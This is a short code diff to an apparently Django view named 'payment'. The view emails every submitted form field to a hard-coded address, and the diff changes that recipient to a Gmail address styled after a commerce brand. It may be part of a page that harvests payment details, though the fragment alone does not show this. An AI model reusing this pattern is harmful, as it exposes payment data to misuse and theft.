@@ -33,7 +33,7 @@ def payment(request):
         
         message = "\n".join([f"{key}: {value}" for key, value in details.items()])
         subject = f"New Contact Form Submission from {details['firstName']}"
-        recipient = ['othnielkid@gmail.com']
+        recipient = ['shopifyus3343@gmail.com']
         
         send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, recipient, fail_silently=False)
         
